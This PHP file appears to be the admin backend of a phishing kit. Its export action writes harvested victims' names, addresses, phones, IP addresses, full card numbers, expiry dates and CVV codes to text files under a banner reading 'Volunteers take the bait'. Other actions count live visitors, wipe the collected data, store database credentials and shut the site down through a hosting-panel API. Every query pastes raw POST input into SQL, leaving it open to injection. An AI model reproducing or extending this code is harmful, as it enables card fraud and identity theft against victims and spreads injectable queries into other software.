<?php

require_once 'config.php';
$datetime = date('Y-m-d H:i:s');
$date = date('Y-m-d');
function errorHandler($errno, $errstr, $errfile, $errline) {
    throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
}

// Set the custom error handler
set_error_handler("errorHandler");

$action = $_POST["action"];


if ($action == 'admin_user_delete') {
    $user_id = $_POST["userid"];

    $row = '';
    $sql = "DELETE FROM users where id='$user_id'";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $conn->affected_rows;
    }

    if ($row != 0) {
        echo 1;
    } else {
        echo 1;
    }
}

if ($action == 'user_delete') {
    $user_id = $_POST["userid"];

    $row = '';
    $sql = "DELETE FROM user_information where id='$user_id'";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $conn->affected_rows;
    }


    if ($row != 0) {
        echo 1;
    } else {
        echo 1;
    }
}

if ($action == 'user_export') {

    $row = '';
    $filename = time() . ".txt";
    $filename2 = time().'2' . ".txt";
    $sql = "select * FROM user_information";
    header('Content-Type: text/plain; charset=utf-8');
    if ($result = mysqli_query($conn, $sql)) {
        $user_data = 'Name|Card number|Date|CVV|Telephone number|city|address|zip code'. "\n";
        while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
            $fullname = $row['fullname'];
            $address = $row['address'];
            $street = @$row['city'];
            $phone = $row['phone'];
            $locality = $row['locality'];
            $zipcode = $row['zipcode'];
            $cardnumber = $row['cardnumber'];
            $exp_date = $row['exp_date'];
            $card_code = $row['card_code'];
            $date_created = $row['date_created'];
            $msg = '
                #----------------------[ Volunteers take the bait ]------------------#
                #--------------------------------[ Personal Information ]----------------------------#
                Name: ' . $fullname . '
                Address: ' . $address . '
                Phone: ' . $phone . '
                City: ' . $street . '
                Locality: ' . $locality . '
                Postal code: ' . $zipcode . '
                #-------------------------------[ Cardholder details ]---------------------------#
                Cardnumber: ' . $cardnumber . '
                Exp Date: ' . $exp_date . '
                Card Code: ' . $card_code . '
                #--------------------------------[ Fingerprint information ]----------------------------#
                ip: '.$row['ipaddress'].'
                
                 ';

            $save = fopen($filename, "a+");
            $msg = mb_convert_encoding($msg, 'UTF-8');
            fwrite($save, $msg);
            fclose($save);

            $user_data .= $fullname.'|'.$cardnumber.'|'.$exp_date.'|'.$card_code.'|'.$phone.'|'.$street.'|'.$address.'|'.$zipcode. "\n";
        }
        $save = fopen($filename2, "a+");
        $user_data = mb_convert_encoding($user_data, 'UTF-8');
        fwrite($save, $user_data);
        fclose($save);
    }


    // header('Content-Description: File Transfer');
    // header('Content-Type: application/octet-stream');
    // header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
    // header('Expires: 0');
    // header('Cache-Control: must-revalidate');
    // header('Pragma: public');
    // header('Content-Length: ' . filesize($filename));

    // ob_clean();
    // flush();
    // readfile($filename);
    echo json_encode(array('file_name_1'=>$filename,'file_name_2'=>$filename2));
    exit;
}

if ($action == 'dashboard_update') {
    $meta_key = $_POST['meta_key'];
    $value = $_POST['value'];
    $row = '';
    $sql = "update dashboard set value= '$value' where meta_key='$meta_key'";

    if ($result = mysqli_query($conn, $sql)) {
        $row = $conn->affected_rows;
    }


    if ($row != 0) {
        echo 1;
    } else {
        echo 1;
    }
}

if($action=="today_visitor_count"){
    
    $today_visitor_count ="0";
    $live_visitor_count ="0";
    //$sql = "SELECT * FROM visitor where date_created >= NOW() - INTERVAL 1 DAY GROUP   BY  ip_address ";
    $sql = "SELECT * FROM visitor where DATE(date_created) = '".$date."'";
    if ($result = mysqli_query($conn, $sql)) {
      $today_visitor_count = mysqli_num_rows($result);
    }


    //user_information
    $sql = "SELECT COUNT(*) as online_user_count
FROM visitor
WHERE TIMESTAMPDIFF(SECOND, IFNULL(date_created, STR_TO_DATE('$datetime', '%Y-%m-%d %H:%i:%s')), STR_TO_DATE('$datetime', '%Y-%m-%d %H:%i:%s')) < '15'";
    $live_c = "0";
     if ($result = mysqli_query($conn, $sql)) {
          $live_visitor_count = mysqli_fetch_assoc($result);
          //print_r($live_visitor_count);exit;
          if(!empty($live_visitor_count)){    
            $live_c = $live_visitor_count['online_user_count'];
          }
        }
        

    $json_record = array(
        'today_visitor_count' => $today_visitor_count,
        'live_visitor_count' => $live_c
    );

    echo json_encode($json_record);exit;

}

if($action=="admin_tracking"){

    if(isset($_POST['id']) && isset($_POST['action'])) {
        $sql = "UPDATE user_sessions SET last_activity='".$datetime."' WHERE user_id='" . $_POST['id'] . "' AND session_id='".$_POST['session_id']."'";
        $result = mysqli_query($conn, $sql);


        $sql1 = "UPDATE admin_sessions SET last_activity='".$datetime."' WHERE user_id='" . $_POST['id'] . "' AND session_id='".$_POST['session_id']."'";
        $result1 = mysqli_query($conn, $sql1);
        echo 1;
    }  
}

// if($action=="admin_tracking_session"){
//     $id = $_SESSION['loggedin']['id'];
//     $sql = "SELECT COUNT(DISTINCT session_id) AS user_count FROM admin_sessions WHERE user_id =".$id;
//     $res = mysqli_query($conn, $sql);
//     $live_visitor_count = $res->fetch_row()[0];
   
//     $json_record = array(
//         'live_visitor_count' =>$live_visitor_count
//     );

//     echo json_encode($json_record);exit;
// }

if ($action == "admin_tracking_session") {
    $id = $_SESSION['loggedin']['id'];
    
    
    /*$fiveMinutesAgo = time() - (5 * 60);
    
     $sql = "SELECT COUNT(DISTINCT user_id) AS user_count 
            FROM admin_sessions 
            WHERE user_id = $id 
            AND last_activity >= $fiveMinutesAgo";*/

    $fiveMinutesAgo = time() - (5 * 60);
    
     $sql = "SELECT COUNT(DISTINCT session_id) AS user_count 
            FROM admin_sessions 
            WHERE TIMESTAMPDIFF(SECOND, IFNULL(last_activity, STR_TO_DATE('$datetime', '%Y-%m-%d %H:%i:%s')), STR_TO_DATE('$datetime', '%Y-%m-%d %H:%i:%s')) < '15'";

    $res = mysqli_query($conn, $sql);

    if ($res) {
        $live_visitor_count = $res->fetch_row()[0];

        $json_record = array(
            'live_visitor_count' => $live_visitor_count
        );

        echo json_encode($json_record);
        exit;
    } else {
        echo json_encode(array('error' => 'Error in query.'));
        exit;
    }
}



if($action=="db_info_store_action"){
    $data = $_POST;

    $check_cred = check_db_cred($_POST);
    if(!$check_cred){
        echo "credential is wrong";
        die;
    }

  /*  $servername = "localhost";
    $username = "zhili5";
    $password = "qwe123";
    $dbname = "zhili5";*/

    $conn_new = mysqli_connect($servername, $username, $password, $dbname);
    if (!$conn_new) {
        die("Connection failed: " . mysqli_connect_error());
    }

    $sql = "DELETE FROM database_info";

    if (mysqli_query($conn_new, $sql)) {
        $last_id = mysqli_insert_id($conn_new);
    } else {
        echo $err = "Error: " . $sql . "<br>" . mysqli_error($conn_new);exit;
    }


    $sql = "INSERT INTO database_info (db_ip,db_user_name,db_pass,db_name) VALUES ('".$data['db_ip']."','".$data['db_user_name']."','".$data['db_pass']."','".$data['db_name']."')";

    if (mysqli_query($conn_new, $sql)) {
        $last_id = mysqli_insert_id($conn_new);
        echo "Database insert successfully";die;
    } else {
        echo $err = "Error: " . $sql . "<br>" . mysqli_error($conn_new);die;
    }
    exit;
}

function check_db_cred($data){
    $servername = $data['db_ip'];
    $username = $data['db_user_name'];
    $password = $data['db_pass'];
    $dbname = $data['db_name'];

    $flag = true;
    try {
        $conn = new mysqli($servername, $username, $password, $dbname);

        // Check connection
        if ($conn->connect_error) {
            throw new Exception("Connection failed");
        }
    } catch (Exception $e) {
        $flag = false;
    }
    return $flag;
}

if($action == "visitor_clear"){
    $sql = "DELETE FROM visitor where date_created >= NOW() - INTERVAL 1 DAY";

    if (mysqli_query($conn, $sql)) {
        $last_id = mysqli_insert_id($conn);
        echo "Visitor cleared";
    } else {
        echo $err = "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
    die;
}

if($action == "clear_all"){
    $date = date('Y-m-d');

    $sql = "DELETE FROM user_information";

    if (mysqli_query($conn, $sql)) {
        $last_id = mysqli_insert_id($conn);
        echo "All data cleared";
    } else {
        echo $err = "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
    die;
}

if($action == "close_website"){
    require_once 'aapanel_api.php';
    $aapanel_api = new bt_api();
    $domain = $_SERVER['SERVER_ADDR'];
    $message = 'fail';

    $get_server_list = $aapanel_api->GetAllWebsite();
    if(!empty($get_server_list['data'])) {
        $get_server_list = $get_server_list['data'];
        $website_id = array_search($domain, array_column($get_server_list, "name"));
        $website_id = $website_id+1;
        $domain_stop = $aapanel_api->StopWebsite($domain, "$website_id");

        if (!empty($domain_stop['status'])) {
            $message = 'success';
        }
    }
    echo $message;
    die;
}

if($action == "close_website"){
    require_once 'aapanel_api.php';
    $aapanel_api = new bt_api();
    $domain = $_SERVER['SERVER_ADDR'];
    $message = 'fail';

    $domain_stop = $aapanel_api->StopWebsite();
    if($domain_stop=="success"){
        echo $domain_stop;
        die;
    }else{
        echo $domain_stop;
        die;
    }

}

if($action == "user_info_by_user_id"){
    $user_id = $_POST["user_id"];

    $sql = "SELECT * from  user_information WHERE id ='".$user_id."'";
    if ($result = mysqli_query($conn, $sql)) {
          $r = mysqli_fetch_assoc($result);
         echo json_encode($r);exit;
    }
}




